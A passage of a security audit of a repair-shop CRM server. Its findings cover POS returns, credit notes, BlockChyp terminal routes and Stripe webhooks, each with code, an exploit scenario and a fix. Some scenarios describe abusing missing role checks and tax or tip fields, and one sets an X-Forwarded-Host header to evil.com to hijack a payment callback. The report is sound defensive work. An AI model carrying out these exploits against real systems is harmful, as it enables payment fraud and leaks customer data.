Before processing each line item, SUM the `quantity` column from existing credit-note line items (`RETURN: <description>`) linked to the same original `invoice_line_items.id`. Reject if `already_returned_qty + requested_qty > lineItem.quantity`. Alternatively track a `returned_quantity` column on `invoice_line_items`.

---

### [HIGH] /pos/return missing idempotency key — concurrent requests double-process returns

**Where:** `packages/server/src/routes/pos.routes.ts:2496`

**What:**
`POST /pos/return` does not use the `idempotent` middleware (unlike `/pos/transaction` and `/pos/sales` which do). Stock restoration and credit-note creation are executed as separate un-transacted `await adb.run()` calls. Two concurrent identical return requests will both read the same line-item record, both pass all checks, and both issue credit notes + restore stock before either commits.

**Code:**
```typescript
// Line 2496 — no 'idempotent' middleware, no Idempotency-Key guard
router.post('/return', asyncHandler(async (req, res) => {
  // ...
  // Non-atomic: stock restore + credit note are separate awaits
  await adb.run('UPDATE inventory_items SET in_stock = in_stock + ? ...', itemQty, ...);
  // ... then separately ...
  const creditResult = await adb.run('INSERT INTO invoices ... VALUES ...', ...);
```

**Exploit:**
A double-click from the manager UI (or a retry from the Android POS client on a slow connection) fires two simultaneous return requests. Both pass the `itemQty > lineItem.quantity` check because neither has committed yet. Both issue separate credit notes and restore stock, effectively doubling the refund value.

**Fix:**
Add the `idempotent` middleware: `router.post('/return', idempotent, asyncHandler(...))`. Also wrap the stock restoration + credit-note insert in a single `adb.transaction()` batch so partial completion is impossible.

---

### [HIGH] Duplicate `/:id/run-billing` route in membership — second registration (with force override) is dead code

**Where:** `packages/server/src/routes/membership.routes.ts:317` and `:452`

**What:**
The file registers `router.post('/:id/run-billing', ...)` twice. Express matches the first registration (line 317) on every request; the second (line 452) is unreachable dead code. The first handler lacks the `?force=1` override parameter that the second handler implements. This means the force-billing bypass is silently unavailable — but more critically, the idempotency guard in the first handler (`current_period_end > now` → 409) cannot be overridden, causing legitimate admin re-billing of past-due subscriptions to fail permanently once a period slips past due without advancing.

**Code:**
```typescript
// Line 317 — registered FIRST, always wins, no `force` support
router.post('/:id/run-billing', asyncHandler(async (req: Request, res: Response) => {
  // ...
  if (sub.current_period_end) {
    const periodEnd = new Date(sub.current_period_end).getTime();
    if (periodEnd > Date.now()) {
      throw new AppError('Subscription is not yet due for renewal ...', 409);
    }
  }
  // ...
}));

// Line 452 — dead code; never reached
router.post('/:id/run-billing', asyncHandler(async (req: Request, res: Response) => {
  const force = req.query.force === '1';
  if (!force && sub.current_period_end) { ... }
}));
```

**Exploit:**
A misconfigured subscription has `current_period_end` set to a future date even though the card failed. Admin calls `POST /:id/run-billing?force=1` to retry immediately — the request hits the first handler which ignores `?force`, returns 409, and the subscription is permanently stuck in `past_due` unless a developer manually patches the DB row.

**Fix:**
Remove the duplicate route. Merge the `force` parameter logic from the second handler into the first. The first handler should read `const force = req.query.force === '1'` and skip the period-end guard when `force` is true (admin-only action already gated by `requireAdmin`).

---

### [MEDIUM] `POST /api/v1/credit-notes/:id/apply` only decrements `amount_due`, does not update `amount_paid` or `status` — ledger desync

**Where:** `packages/server/src/routes/creditNotes.routes.ts:278–297`

**What:**
When a credit note is applied to an invoice, the handler decrements `invoices.amount_due` but never increments `invoices.amount_paid` or updates `invoices.status` (e.g., from `partial` to `paid`). The invoice's ledger row becomes inconsistent: `amount_paid + amount_due < total`, meaning reports that rely on `amount_paid` for revenue recognition (commission calculation, loyalty accrual, reconciliation) will under-count revenue even after the debt has been fully settled.

**Code:**
```typescript
const newAmountDue = Math.max(0, inv.amount_due - creditDollars);
req.db.transaction(() => {
  req.db.prepare(`
    UPDATE invoices
       SET amount_due = ?,         -- decremented
           updated_at = datetime('now')
     WHERE id = ?
  `).run(newAmountDue, invoiceIdNum);
  // amount_paid is NOT updated; status is NOT updated
  // ...
})();
```

**Exploit:**
Invoice total=$100, amount_paid=$0, amount_due=$100. A $100 credit note is applied: `amount_due` becomes 0 but `amount_paid` stays 0. The invoice status remains `unpaid`. Any cron or report that checks `status IN ('unpaid','partial')` to chase overdue payments will include this invoice. Commission and loyalty point accrual that trigger on `amount_paid` increments will never fire.

**Fix:**
Inside the transaction, also compute and apply `newAmountPaid = Math.min(inv.amount_paid + creditDollars, inv.total)` and update `status` using the same logic as `invoices.routes.ts:800` (`paid` / `partial` / `unpaid`). Mirror what `POST /:id/credit-note` in `invoices.routes.ts:1256` does correctly.

---

### [MEDIUM] `POST /api/v1/installments` — any authenticated user can create installment plans (no role gate)

**Where:** `packages/server/src/routes/installments.routes.ts:38`

**What:**
`POST /api/v1/installments` creates a payment plan binding a customer to pay `total_cents` split across N schedule rows. The only guards are `authMiddleware` (any logged-in user) and a per-user rate limit. A cashier or technician can create installment plans against any customer, setting arbitrary `acceptance_token` (customer name), `acceptance_signed_at`, schedule amounts, and frequency — without manager or admin approval. The cancel endpoint at `POST /:id/cancel` correctly requires admin/manager, but creation does not.

**Code:**
```typescript
// No requirePermission, no requireManagerOrAdmin
router.post('/', asyncHandler(async (req: Request, res: Response) => {
  const rlResult = consumeWindowRate(db, 'installment_create', ...);
  if (!rlResult.allowed) throw new AppError('Too many plan creates — please slow down', 429);
  // ... proceeds to INSERT installment_plans
```

**Exploit:**
A cashier calls `POST /api/v1/installments` with `customer_id=42`, `total_cents=100000`, `installment_count=120`, `schedule=[...]`, `acceptance_token="John Smith"`. An unauthorized $1000/120-month plan is now on record, signed with an arbitrary customer name, which could be used to claim the customer agreed to a payment plan they never saw.

**Fix:**
Add `requirePermission('installments.create')` or an inline `requireManagerOrAdmin(req)` check as the first line of the handler, consistent with the cancel handler's pattern.

---

### [MEDIUM] `POST /pos/sales` (Android endpoint) — no POS PIN requirement unlike `/pos/transaction`

**Where:** `packages/server/src/routes/pos.routes.ts:941`

**What:**
`POST /pos/transaction` uses the `requirePosPinSale` middleware that checks `pos_require_pin_sale` store config and requires the `X-Pos-Pin-Verified: 1` header. `POST /pos/sales` (the Android POS endpoint that accepts cents-based line items) is registered as `router.post('/sales', idempotent, asyncHandler(...))` with no PIN middleware. Both routes complete sales and create invoices/payments. An attacker who obtains a valid JWT (e.g., from a compromised cashier session) can bypass the PIN requirement by calling the Android endpoint directly.

**Code:**
```typescript
// /pos/transaction — has PIN guard
router.post('/transaction', requirePosPinSale, idempotent, asyncHandler(async (req, res) => {

// /pos/sales — no PIN guard
router.post('/sales', idempotent, asyncHandler(async (req, res) => {
```

**Exploit:**
Store enables `pos_require_pin_sale`. Attacker has a stolen cashier JWT. They POST to `/api/v1/pos/sales` with a full cart. The sale completes, stock decrements, invoice is created — PIN check entirely bypassed.

**Fix:**
Add `requirePosPinSale` middleware to the `/sales` route: `router.post('/sales', requirePosPinSale, idempotent, asyncHandler(...))`.

---

### [MEDIUM] `/pos/sales` misc lines accept client-supplied `tax_rate` (0..1 fraction) — attacker can set tax to zero

**Where:** `packages/server/src/routes/pos.routes.ts:1086–1093`

**What:**
For misc/custom lines (no `item_id`) in `/pos/sales`, the server honors a client-supplied `tax_rate` field (expected to be a fraction 0..1 from the Android DTO). Any cashier can set `tax_rate: 0` for any misc line item, bypassing tax collection entirely. There is no allowlist of valid rates, no verification against `tax_classes`, and no role check on the field.

**Code:**
```typescript
} else {
  // No tax class on the inventory item OR misc line: honor client tax_rate
  const cliRate = Number(ln?.tax_rate);
  if (Number.isFinite(cliRate) && cliRate > 0 && cliRate < 1) {
    lineTax = roundCents(lineNet * cliRate);
  }
  // cliRate = 0 accepted silently → lineTax = 0
}
```

**Exploit:**
A cashier rings up a $500 labor charge as a misc line with `tax_rate: 0` (or simply omits `tax_rate`). No tax is collected. For a shop in a 10% sales-tax jurisdiction this is $50 in unpaid tax per transaction. The cashier could do this intentionally to discount a customer or accidentally, with no audit trail flagging the zero-tax sale.

**Fix:**
Remove client-supplied `tax_rate` from misc lines. Instead, require callers to pass a `tax_class_id` for taxable misc items and look up the rate server-side. If a legacy fallback is needed, restrict non-zero client rates to admin/manager roles and add an audit log entry whenever a client-supplied rate is used.

---

### [MEDIUM] `POST /pos/return` is not transactional — partial failure leaves orphaned stock movements

**Where:** `packages/server/src/routes/pos.routes.ts:2558–2636`

**What:**
The return handler iterates line items and for each one issues an `UPDATE inventory_items` and an `INSERT stock_movements` as separate `await adb.run()` calls outside any transaction. The credit note INSERT and refund INSERT are also separate calls. If the server crashes or a later line item lookup fails mid-loop, some items will have had their stock restored without a matching credit note or refund record, permanently inflating inventory without any financial record.

**Code:**
```typescript
for (const item of items) {
  // ...
  if (lineItem.inventory_item_id) {
    await adb.run('UPDATE inventory_items SET in_stock = in_stock + ? ...', ...); // not in tx
    await adb.run('INSERT INTO stock_movements ...', ...);                         // not in tx
  }
  returnDetails.push(...);
}
// only AFTER the loop:
const creditResult = await adb.run('INSERT INTO invoices ...', ...);  // not in tx
await adb.run('INSERT INTO refunds ...', ...);
```

**Exploit:**
A return is submitted for 3 line items. Item 2 causes a DB error mid-loop. Item 1's stock has been restored and its movement recorded; items 2 and 3 have not. No credit note was created. The shop's inventory is now over by 1 unit with no matching financial record.

**Fix:**
Build all stock restoration UPDATEs, movement INSERTs, credit note INSERT, and refund INSERT as a `TxQuery[]` batch and execute via `adb.transaction()` once, mirroring the pattern in `/pos/transaction`.

---

### [MEDIUM] Overpayment store-credit upsert in `POST /invoices/:id/payments` is not atomic — race condition

**Where:** `packages/server/src/routes/invoices.routes.ts:828–843`

**What:**
When a payment results in an overpayment, the handler does a `SELECT` on `store_credits` followed by either an `UPDATE` or `INSERT` as two separate `await adb.run()` calls. Two concurrent overpayment payments on the same invoice can both read the same SELECT (no row → INSERT path), then both INSERT a store_credits row for the same customer, violating the expected one-row-per-customer model. The UPSERT pattern already used correctly in `refunds.routes.ts:385` is not applied here.

**Code:**
```typescript
const existingCredit = await adb.get<...>('SELECT id, amount FROM store_credits WHERE customer_id = ?', ...);
if (existingCredit) {
  await adb.run("UPDATE store_credits SET amount = ?, ...", roundCents(...), existingCredit.id);
} else {
  await adb.run('INSERT INTO store_credits (customer_id, amount) VALUES (?, ?)', ...);
}
```

**Exploit:**
Two simultaneous payments on the same invoice both trigger the overpayment path. Both read no existing store_credits row. Both INSERT a new row. The customer now has two store_credits rows; subsequent balance reads with `SUM` would work but the UNIQUE constraint (if present) would explode with an unhandled 500.

**Fix:**
Replace the SELECT+INSERT/UPDATE pattern with the same atomic UPSERT already used in `refunds.routes.ts:385`:
```sql
INSERT INTO store_credits (customer_id, amount, ...)
VALUES (?, ?, ...)
ON CONFLICT(customer_id) DO UPDATE SET amount = amount + excluded.amount, ...
```

---

### [LOW] `POST /api/v1/credit-notes` (standalone table) — any authenticated user can create credit notes for unlimited amounts

**Where:** `packages/server/src/routes/creditNotes.routes.ts:163`

**What:**
`POST /api/v1/credit-notes/` creates credit note records in the `credit_notes` table (as opposed to the negative-invoice credit notes in `invoices.routes.ts`). The create handler uses `writeRateLimit()` but has no role gate — any authenticated user can create credit notes of any `amount_cents`. The `GET` and apply/void endpoints require manager/admin, but the creation endpoint does not.

**Code:**
```typescript
router.post('/', asyncHandler(async (req, res) => {
  if (!req.user) throw new AppError('Not authenticated', 401);
  writeRateLimit(req);
  // ... no requireManagerOrAdmin check
  const safeCents = typeof amount_cents === 'number' ? amount_cents : parseInt(...);
  if (!Number.isInteger(safeCents) || safeCents <= 0) { throw ... }
  // INSERT credit_notes with safeCents
```

**Exploit:**
A cashier creates a $10,000 credit note for any customer with one API call. While the credit note itself isn't immediately redeemable (apply requires manager/admin), its existence in the system could mislead reconciliation reports or be used as social engineering evidence.

**Fix:**
Add `requireManagerOrAdmin(req)` as the first line of `POST /` handler, consistent with the apply and void endpoints.

---

### [LOW] `POST /membership/subscribe` records `last_charge_amount = tier.monthly_price` without actually charging — inflated billing history

**Where:** `packages/server/src/routes/membership.routes.ts:191–210`

**What:**
The subscribe endpoint sets `last_charge_at = start` and `last_charge_amount = tier.monthly_price` at INSERT time, without triggering any actual payment. A subscription payment row is inserted with `status = 'success'` even though no charge occurred. This corrupts the billing history: the first genuine charge via `run-billing` will appear as a *second* charge of `monthly_price`, making the customer's receipt history show they were charged twice for the first period.

**Code:**
```typescript
result = await adb.run(
  `INSERT INTO customer_subscriptions (..., last_charge_at, last_charge_amount)
   VALUES (?, ?, ?, 'active', ?, ?, ?, ?, ?)`,
  customer_id, tier_id, blockchyp_token, start, end, signature_file, start, tier.monthly_price
);
// Then immediately:
await adb.run(
  'INSERT INTO subscription_payments (subscription_id, amount, status) VALUES (?, ?, ?)',
  result.lastInsertRowid, tier.monthly_price, 'success'  // no actual charge
);
```

**Exploit:**
Customer subscribes at $29.99/mo. Subscription row created with `last_charge_amount=29.99`, and a `subscription_payments` row with `status='success'` and `amount=29.99`. No money moves. One month later, `run-billing` charges $29.99 and inserts another `subscription_payments` row. Customer's portal shows two "$29.99 success" entries; they dispute the double charge.

**Fix:**
On initial subscribe, only insert the subscription row. Omit `last_charge_amount`/`last_charge_at` (or set them to NULL). Do not insert a `subscription_payments` row unless `blockchyp_token` is present and a real charge is actually attempted. Record the enrollment separately with a distinct `type='enrollment'` column.

---

### [INFO] Installments schedule sum vs. total_cents uses integer equality — float drift possible

**Where:** `packages/server/src/routes/installments.routes.ts:83–89`

**What:**
The schedule sum validation uses `scheduleSum !== total_cents` (strict equality on JavaScript numbers). Both values come from `Number(row.amount_cents)` conversions. If a client sends floats (e.g., `amount_cents: 33.33`), `Number()` preserves the float and the sum may drift by a fraction of a cent, causing legitimate plans to be rejected or (if the caller rounds differently) accepted with a 1-cent shortfall.

**Code:**
```typescript
const scheduleSum = schedule.reduce(
  (acc: number, row: any) => acc + (Number(row.amount_cents) || 0), 0
);
if (scheduleSum !== total_cents) {
  throw new AppError(`schedule amounts sum to ${scheduleSum} but total_cents is ${total_cents}...`, 400);
}
```

**Exploit:**
Low severity — mainly an API usability issue. No financial impact since amounts are stored as-is and the mismatch guard rejects the request. However, a rounding-aware client could bypass the check by sending `amount_cents: 33.333...` repeated, summing to `total_cents: 99.999`, which `Number()` may round identically or differently depending on JS engine float representation.

**Fix:**
Add `Math.floor()` or `Math.round()` to each `amount_cents` in the reduce, and compare `Math.round(scheduleSum)` to `Math.round(total_cents)`. Also add an explicit integer check on each schedule row: `if (!Number.isInteger(amountCents)) throw AppError(...)` before summing.

---


---

# S20-blockchyp

# S20 — BlockChyp Payment Terminal Integration

Audited files:
- `packages/server/src/routes/blockchyp.routes.ts`
- `packages/server/src/services/blockchyp.ts`
- `packages/server/src/db/migrations/040_blockchyp.sql`
- `packages/server/src/db/migrations/080_payment_idempotency_and_signature.sql`
- `packages/server/src/db/migrations/099_payment_idempotency_user_scope.sql`
- `packages/server/src/routes/settings.routes.ts` (BlockChyp config GET/PUT)
- `packages/server/src/routes/paymentLinks.routes.ts` (callbackUrl construction)
- `packages/server/src/routes/membership.routes.ts` (chargeToken / enrollCard)
- `packages/server/src/utils/configEncryption.ts` (credential storage)
- `packages/server/src/utils/circuitBreaker.ts` (singleton breaker)

---

### [MEDIUM] Unbounded tip amount allows manager to charge arbitrary tip

**Where:** `packages/server/src/routes/blockchyp.routes.ts:287-306`

**What:**
The `tip` field in POST `/process-payment` is validated only as `typeof tip === 'number' && tip > 0` — there is no upper bound. The tip is added directly to `baseChargeAmount` and dispatched to BlockChyp. A manager (role `manager` or `admin`) can supply `tip: 999999.99` against an invoice with a $1.00 balance and instruct BlockChyp to charge the card $1,000,000.99.

**Code:**
```typescript
const tipAmount = tip && typeof tip === 'number' && tip > 0 ? tip : 0;
// ... no upper-bound check ...
const chargeAmount = baseChargeAmount + tipAmount;
// ...
result = await processPayment(db, chargeAmount, ticketRef, tipAmount > 0 ? tipAmount : undefined);
```

**Exploit:**
A rogue or compromised manager session sends `POST /api/v1/blockchyp/process-payment` with `{ invoiceId: X, tip: 999999.99 }`. BlockChyp receives the charge request for the full amount and, if the card limit allows, authorises it. The customer is billed far beyond the invoice total with no server-side guard.

**Fix:**
Cap `tip` server-side to a reasonable maximum (e.g. 2× `amountDue` or a hard dollar limit such as `$500`). Reject with 400 if `tipAmount > MAX_TIP`. Add a corresponding frontend warning for unusually large tip percentages.

---

### [MEDIUM] No role check on signature-capture endpoints — any authenticated user can trigger terminal T&C flow

**Where:** `packages/server/src/routes/blockchyp.routes.ts:66-116`

**What:**
`POST /capture-checkin-signature` and `POST /capture-signature` have no role guard — only an `isBlockChypEnabled` check. Any authenticated user of any role (including read-only `staff` or `technician`) can invoke these endpoints. `/capture-signature` additionally accepts a `ticketId` from the body and updates `tickets.signature_file` after a successful T&C capture, meaning any user can overwrite the signature record on any ticket they know the ID of.

**Code:**
```typescript
router.post('/capture-checkin-signature', asyncHandler(async (req: Request, res: Response) => {
  const db = req.db;
  if (!isBlockChypEnabled(db)) {           // no role check here
    throw new AppError('BlockChyp terminal is not enabled', 400);
  }
  // ... proceeds to push T&C to the physical terminal
  const result = await capturePreTicketSignature(db);
```

**Exploit:**
A technician-role user sends `POST /api/v1/blockchyp/capture-signature` with `{ ticketId: 999 }` for a ticket they do not own. BlockChyp pushes the configured T&C text to the physical terminal, captures the customer's signature, and the route overwrites `tickets.signature_file` with the new filename — silently replacing a legitimate signature.

**Fix:**
Add `if (req.user?.role !== 'admin' && req.user?.role !== 'manager')` guards on both routes, matching the role gate on `process-payment`. Scope the ticket UPDATE to also confirm ticket ownership/assignment if least-privilege is desired.

---

### [MEDIUM] No role check on `/adjust-tip` — any authenticated user can attempt tip adjustment

**Where:** `packages/server/src/routes/blockchyp.routes.ts:553-579`

**What:**
`POST /adjust-tip` accepts `transaction_id` and `new_tip` from any authenticated user without a role check. The `audit` call on line 569 uses `req.user?.id ?? null`, meaning the audit log can record a null user_id, silently accepting anonymous-looking entries. Although the underlying `adjustTip()` currently returns `NOT_SUPPORTED`, when tip-adjust support is added to the SDK the endpoint will immediately be exploitable by any role.

**Code:**
```typescript
router.post('/adjust-tip', asyncHandler(async (req: Request, res: Response) => {
  const db = req.db;
  const { transaction_id, new_tip } = req.body || {};
  if (!isBlockChypEnabled(db)) { /* only gate */ }
  // no role check before calling adjustTip
  const result = await adjustTip(db, transaction_id, new_tip);
  audit(db, 'blockchyp_tip_adjust_attempt', req.user?.id ?? null, ...);
```

**Exploit:**
When BlockChyp SDK ships tip-adjust support and the route body is uncommented, a cashier-level user can call this endpoint with any `transaction_id` and inflate/deflate a tip on a completed transaction without admin approval.

**Fix:**
Add an `admin` or `manager` role check identical to the one on `process-payment`. Fix the audit call to use `req.user!.id` (guarded after the role check) so the event is always attributed to an authenticated user.

---

### [MEDIUM] Host-header injection poisons BlockChyp payment-link callback URL

**Where:** `packages/server/src/routes/paymentLinks.routes.ts:386-388`

**What:**
The public `POST /:token/pay` endpoint (no authentication) constructs the BlockChyp `callbackUrl` by concatenating `req.headers['x-forwarded-host'] || req.headers.host`. Express's `trust proxy` allowlist controls X-Forwarded-For IP attribution but does NOT validate `x-forwarded-host`. An unauthenticated attacker can set this header to an arbitrary hostname, causing BlockChyp to register the callback against an attacker-controlled URL. When the customer completes payment BlockChyp will POST the completion event to the attacker's host, leaking the payment status notification (and any payload fields BlockChyp includes).

**Code:**
```typescript
// public endpoint — no auth
const protocol = req.headers['x-forwarded-proto'] || (req.secure ? 'https' : 'http');
const host = req.headers['x-forwarded-host'] || req.headers.host || 'localhost';
const callbackUrl = `${protocol}://${host}/api/v1/public/payment-links/${encodeURIComponent(token)}/paid-callback`;
// callbackUrl sent to BlockChyp.sendPaymentLink(request)
```

**Exploit:**
Attacker knows a valid payment-link token (obtained legitimately or via token prediction). They send `POST /api/v1/public/payment-links/<token>/pay` with `X-Forwarded-Host: evil.com`. The registered `callbackUrl` becomes `https://evil.com/…/paid-callback`. On customer payment, BlockChyp fires the webhook to the attacker's server, leaking the completion event.

**Fix:**
Derive the callback host from a server-side config value (`config.baseUrl` or `config.baseDomain`) rather than from a request header. Never trust `x-forwarded-host` from unauthenticated callers.

---

### [MEDIUM] Global BlockChyp circuit breaker is a module-level singleton — cross-tenant DoS in multi-tenant mode

**Where:** `packages/server/src/services/blockchyp.ts:16-20`

**What:**
`blockchypBreaker` and `reconcileBreaker` are created once at module import time and shared across all tenant requests in the same Node process. In multi-tenant mode (`MULTI_TENANT=true`) a single tenant that drives 5 consecutive BlockChyp failures (network issues, bad credentials, or deliberate load) opens the circuit for 60 seconds, causing all other tenants' BlockChyp calls to fast-fail with `CircuitBreakerOpenError`.

**Code:**
```typescript
// module-level singletons — one instance per Node process, not per tenant
const blockchypBreaker = createBreaker('blockchyp');
const reconcileBreaker = createBreaker('blockchyp_reconcile');
// used for ALL tenant charges:
const response = await blockchypBreaker.run(() => client.charge(request));
```

**Exploit:**
An attacker with a legitimate tenant account repeatedly calls `POST /process-payment` using invalid or expired BlockChyp credentials, triggering 5 failures in quick succession. The shared breaker opens and every other tenant on the same server receives payment failures for up to 60 seconds, disabling payment processing for all stores.

**Fix:**
Key the circuit breaker by tenant slug (or by credential hash, since different tenants use different terminals). Create breaker instances lazily in a `Map<string, CircuitBreaker>` indexed by tenant identifier, so one tenant's failures cannot trip another's.

---

### [LOW] No rate limiting on any BlockChyp endpoint

**Where:** `packages/server/src/routes/blockchyp.routes.ts` (all handlers)

**What:**
None of the six BlockChyp route handlers (`/test-connection`, `/capture-checkin-signature`, `/capture-signature`, `/process-payment`, `/void-payment`, `/adjust-tip`) apply `checkWindowRate` or any rate-limiter middleware. The 30-second same-amount dedup window on `process-payment` partially mitigates double-clicks but does not prevent rapid charges of varying amounts on the same invoice, or rapid triggering of T&C signature flows.

**Code:**
```typescript
// No rate limit call before any handler:
router.post('/capture-checkin-signature', asyncHandler(async ...
router.post('/process-payment', asyncHandler(async ...
```

**Exploit:**
A manager with a compromised session can send hundreds of `/capture-checkin-signature` requests per second, tying up the physical terminal and blocking legitimate customer interactions for the duration. For `/process-payment`, varying the `tip` amount each time bypasses the 30-second dedup check.

**Fix:**
Apply `consumeWindowRate` (already used in other sensitive routes) on at minimum `/process-payment` and `/capture-checkin-signature`, with per-user limits (e.g. 10 payment attempts per minute per user_id).

---

### [LOW] T&C signature can be bypassed — sale recorded without terms_audit entry when tcEnabled=true

**Where:** `packages/server/src/routes/blockchyp.routes.ts:131-471` (process-payment), `packages/server/src/db/migrations/` (no migration 159)

**What:**
When `blockchyp_tc_enabled = true`, the intent is to capture customer T&C acceptance before payment. However, `POST /process-payment` contains no check that a T&C signature was previously captured for the ticket. A manager can call `/process-payment` directly, skipping `/capture-checkin-signature` entirely. There is also no `blockchyp_terms_audit` table (migration 159 referenced in the audit plan does not exist), so there is no per-transaction record linking the terms text (`tcContent`) to the signature file at the moment of signing.

**Code:**
```typescript
// process-payment: no check for prior T&C signature
router.post('/process-payment', asyncHandler(async (req: Request, res: Response) => {
  // ... reads invoiceId, tip, amount ...
  // tcEnabled is never consulted here
  result = await processPayment(db, chargeAmount, ticketRef, ...);
```

**Exploit:**
In a dispute, the shop cannot prove the customer accepted the repair terms because: (a) the T&C step was silently skipped, and (b) there is no database record binding the terms text version to the signature file. A customer can credibly claim they never consented.

**Fix:**
When `tcEnabled` is true, `process-payment` should verify that `tickets.signature_file IS NOT NULL` for the associated ticket (or that a `blockchyp_terms_audit` row exists) before dispatching the charge. Separately, create the `blockchyp_terms_audit` table to record `(ticket_id, tc_name, tc_content_hash, signature_file, captured_at, transaction_id)` at T&C capture time.

---

### [INFO] Signature file written from BlockChyp response has no size cap

**Where:** `packages/server/src/services/blockchyp.ts:222-228`

**What:**
`saveSignatureFile` writes `Buffer.from(sigFileHex, 'hex')` to disk without any size validation. A compromised or spoofed BlockChyp gateway response could return a multi-megabyte `sigFile` hex string, consuming arbitrary disk space. No maximum hex length or decoded byte limit is enforced before the `writeFileSync` call.

**Code:**
```typescript
function saveSignatureFile(sigFileHex: string, format: string): SavedSignature {
  const buffer = Buffer.from(sigFileHex, 'hex');  // no length check
  const filename = `sig-${Date.now()}-${crypto.randomBytes(8).toString('hex')}${ext}`;
  fs.writeFileSync(absolutePath, buffer);          // unbounded write
  return { filename, absolutePath };
}
```

**Exploit:**
An attacker who can MITM or compromise the BlockChyp gateway can return an oversized `sigFile` value, filling the server's disk and causing a DoS for all tenants sharing the same filesystem.

**Fix:**
Add a size guard before writing: `if (sigFileHex.length > MAX_SIG_HEX_LEN) throw new Error(...)` where `MAX_SIG_HEX_LEN` corresponds to a reasonable decoded image size (e.g. 2 MB = 4,000,000 hex chars).

---


---

# S21-stripe-webhooks

# S21 — Stripe + Payment Webhook Handlers

**Auditor:** Claude Sonnet 4.6 (security-audit slot 21)
**Scope:** `packages/server/src/services/stripe.ts`, `services/webhooks.ts`, `routes/billing.routes.ts`, `routes/dunning.routes.ts`, `routes/voice.routes.ts`, `routes/blockchyp.routes.ts`, `index.ts` (mount order / rate limiting)

---

### HIGH — Stripe webhook endpoint has no rate limiting

**Where:** `packages/server/src/index.ts:1183` (global rate-limiter skip), `packages/server/src/index.ts:1212` (webhook mount), `packages/server/src/routes/billing.routes.ts:101` (webhookHandler)

**What:**
The global API rate limiter at `index.ts:1181–1207` unconditionally skips every request whose path contains the string `"webhook"` (line 1183: `req.path.includes('webhook')`). The Stripe webhook is mounted at `/api/v1/billing/webhook`, which matches. The per-tenant `billingRateLimit` middleware is only wired to `/checkout` and `/portal`, not to the exported `webhookHandler`. The `webhookRateLimit` helper (line 1538) is also not applied to the billing webhook. Result: the Stripe webhook endpoint receives zero rate limiting.

**Code:**
```typescript
// index.ts:1181-1184
app.use('/api/v1', (req, res, next) => {
  // Skip endpoints that have their own rate limiting
  if (req.path.startsWith('/auth') || req.path.includes('webhook') || ...) {
    return next(); // billing/webhook bypasses global limiter here
  }
  ...
});
// index.ts:1212 — no webhookRateLimit middleware added
app.post('/api/v1/billing/webhook', express.raw({ type: 'application/json', limit: '1mb' }), stripeWebhookHandler);
```

**Exploit:**
An attacker who knows or guesses the webhook URL (it's a well-known path) can flood `/api/v1/billing/webhook` with thousands of requests per second. Each request triggers signature verification (CPU-bound HMAC), body buffering (up to 1 MB), and DB transaction overhead, potentially causing denial of service. Stripe's own webhook IP allowlist is not enforced by the server.

**Fix:**
Apply `webhookRateLimit` to the Stripe webhook mount, or add a separate IP allowlist for [Stripe's documented webhook IPs](https://stripe.com/docs/ips). At minimum: `app.post('/api/v1/billing/webhook', webhookRateLimit, express.raw({...}), stripeWebhookHandler)`.

---

### HIGH — `customer.subscription.updated` sets plan=pro without price ID validation

**Where:** `packages/server/src/services/stripe.ts:897–907`

**What:**
The `customer.subscription.updated` handler unconditionally sets `plan = 'pro'` whenever `sub.status === 'active'`, without inspecting `sub.items.data[*].price.id` against `STRIPE_PRO_PRICE_ID`. This means if Stripe ever fires a `subscription.updated` event for a tenant's subscription that is in `status: 'active'` but on a lower-priced or free plan (e.g. during a downgrade where Stripe marks the old subscription active briefly, or if the operator manually creates a $0 subscription in the Stripe dashboard for testing), the tenant will be granted pro-tier entitlements without actually paying the pro price.

**Code:**
```typescript
case 'customer.subscription.updated': {
  const sub = event.data.object as Stripe.Subscription;
  // ...tenant lookup by stripe_subscription_id...

  if (sub.status === 'active') {
    masterDb.prepare(`UPDATE tenants SET plan = 'pro', ...  WHERE id = ?`)
      .run(tenantWithSub.id);
    // Price ID never checked — any active sub = pro
  }
  ...
}
```

**Exploit:**
An operator creates a test $0 subscription in the Stripe dashboard for a tenant, linking it to the tenant's stripe_subscription_id. When Stripe fires `subscription.updated` with `status: 'active'`, the tenant is upgraded to pro regardless of price. In a forged-signature scenario (extremely unlikely if HMAC verified), it could also be triggered remotely.

**Fix:**
Before setting `plan = 'pro'`, verify `sub.items.data.some(item => item.price.id === config.stripeProPriceId || item.price.id === process.env.STRIPE_ENTERPRISE_PRICE_ID)`. If no matching price is found, skip the upgrade or log a discrepancy alert.

---

### MEDIUM — Outbound webhook secret stored in plaintext despite docstring claiming encryption

**Where:** `packages/server/src/services/webhooks.ts:7` (docstring), `packages/server/src/services/webhooks.ts:255–265` (storage), `packages/server/src/utils/configEncryption.ts:35–46` (ENCRYPTED_CONFIG_KEYS set)

**What:**
The module docstring states: "The secret is auto-generated on first use and stored encrypted via configEncryption." However, `getOrCreateWebhookSecret` directly reads and writes `store_config` via raw SQL without using `getConfigValue` / `encryptConfigValue`. The `'webhook_secret'` key is absent from `ENCRYPTED_CONFIG_KEYS` in `configEncryption.ts`. The secret is therefore stored in plaintext in the tenant SQLite database. If a tenant DB file is exfiltrated (e.g. via a backup or a file path traversal), the attacker obtains the signing key used to authenticate outbound webhook delivery signatures — allowing them to forge webhook deliveries to customers' webhook endpoints.

**Code:**
```typescript
// webhooks.ts:255-266
const existing = db
  .prepare("SELECT value FROM store_config WHERE key = 'webhook_secret'")
  .get() as { value?: string } | undefined;  // no decryption
if (existing?.value) return existing.value;
const candidate = crypto.randomBytes(32).toString('hex');
db.prepare(
  "INSERT OR IGNORE INTO store_config (key, value) VALUES ('webhook_secret', ?)"
).run(candidate);  // stored plaintext, not encryptConfigValue(candidate)
```

**Exploit:**
An attacker who exfiltrates any tenant's SQLite DB file can read `SELECT value FROM store_config WHERE key='webhook_secret'` and use it to forge HMAC-SHA256 signatures on any payload, convincing customer systems that the forged request is a legitimate webhook from BizarreCRM.

**Fix:**
Add `'webhook_secret'` to `ENCRYPTED_CONFIG_KEYS` in `configEncryption.ts`. Update `getOrCreateWebhookSecret` to use `encryptConfigValue(candidate)` on insert and `getConfigValue(db, 'webhook_secret')` on read. Run a one-time migration to re-encrypt existing plaintext values (the auto-encrypt boot sweep in `index.ts:330–338` already handles this for ENCRYPTED_CONFIG_KEYS members).

---

### MEDIUM — `voiceInstructionsHandler` lacks provider signature verification (IRSV/toll fraud risk)

**Where:** `packages/server/src/routes/voice.routes.ts:694–720`, `packages/server/src/index.ts:1562`

**What:**
